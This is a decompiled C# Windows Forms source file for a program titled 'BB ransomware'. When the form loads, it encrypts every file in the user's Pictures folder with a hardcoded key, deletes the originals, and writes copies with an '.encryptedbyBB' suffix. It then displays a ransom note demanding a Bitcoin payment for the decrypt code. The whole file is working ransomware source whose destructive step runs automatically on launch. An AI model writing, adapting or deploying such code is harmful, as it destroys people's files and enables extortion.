using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BB_ransomware.My;
using BB_ransomware.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace BB_ransomware;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label1_Click;
			Label label = _Label1;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label1 = value;
			label = _Label1;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox6")]
	internal virtual TextBox TextBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string[] files = Directory.GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures());
		string[] array = files;
		foreach (string text in array)
		{
			string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text);
			TextBox1.set_Text(text2);
			string text3 = TextBox1.get_Text();
			string key = "2101";
			Class1 @class = new Class1(key);
			string text4 = @class.EncryptData(text3);
			TextBox3.set_Text(text4);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			string text5 = text + ".encryptedbyBB";
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(text5, true);
			streamWriter.WriteLine(TextBox3.get_Text());
			streamWriter.Close();
		}
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		string encryptedtext = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(TextBox6.get_Text());
		string text = Interaction.InputBox("Enter code: ", "", "", -1, -1);
		if (Operators.CompareString(text, "2101", false) == 0)
		{
			Class1 @class = new Class1(text);
			try
			{
				string text2 = @class.DecryptData(encryptedtext);
				TextBox4.set_Text(text2);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(TextBox6.get_Text());
				StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(TextBox6.get_Text(), true);
				streamWriter.WriteLine(TextBox4.get_Text());
				streamWriter.Close();
				MessageBox.Show("Success Decrypt. Please click file with right button on mouse, and click change name. Delete .encryptedbyBB", "BB ransomware", (MessageBoxButtons)0);
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)"Can't decrypt", (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox((object)"Wrong code. Hahaha", (MsgBoxStyle)0, (object)null);
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Form2).Show();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_026b: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_05f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0600: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		TextBox4 = new TextBox();
		TextBox5 = new TextBox();
		Label1 = new Label();
		TextBox6 = new TextBox();
		Label2 = new Label();
		Label3 = new Label();
		Button1 = new Button();
		Button2 = new Button();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(689, 12));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(100, 20));
		((Control)TextBox1).set_TabIndex(0);
		((Control)TextBox1).set_Visible(false);
		((Control)TextBox2).set_Location(new Point(689, 38));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(100, 20));
		((Control)TextBox2).set_TabIndex(1);
		((Control)TextBox2).set_Visible(false);
		((Control)TextBox3).set_Location(new Point(689, 64));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(100, 20));
		((Control)TextBox3).set_TabIndex(2);
		((Control)TextBox3).set_Visible(false);
		((Control)TextBox4).set_Location(new Point(689, 90));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(100, 20));
		((Control)TextBox4).set_TabIndex(3);
		((Control)TextBox4).set_Visible(false);
		((Control)TextBox5).set_Location(new Point(689, 116));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(100, 20));
		((Control)TextBox5).set_TabIndex(4);
		((Control)TextBox5).set_Visible(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Red);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)Label1).set_Location(new Point(12, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(657, 231));
		((Control)Label1).set_TabIndex(5);
		Label1.set_Text("Hello! I'm a BB, and Im encrypt your\r\nfiles\r\n\r\nPlease give me a BTC To address:\r\n13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\r\n\r\nAnd I send you decrypt code");
		((Control)TextBox6).set_Location(new Point(45, 376));
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(100, 20));
		((Control)TextBox6).set_TabIndex(6);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Red);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label2).set_Location(new Point(14, 307));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(416, 40));
		((Control)Label2).set_TabIndex(7);
		Label2.set_Text("If you have a special decrypt code, please select Path and\r\ndecrypt file");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Red);
		((Control)Label3).set_Location(new Point(7, 379));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(32, 13));
		((Control)Label3).set_TabIndex(8);
		Label3.set_Text("Path:");
		((ButtonBase)Button1).set_BackColor(Color.Red);
		((Control)Button1).set_Location(new Point(29, 402));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(75, 23));
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("Decrypt file");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)Button2).set_Location(new Point(550, 350));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(222, 42));
		((Control)Button2).set_TabIndex(10);
		((ButtonBase)Button2).set_Text("Get me a decrypt code (check payment)");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.indek1s);
		((Form)this).set_ClientSize(new Size(801, 453));
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("BB ransomware");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
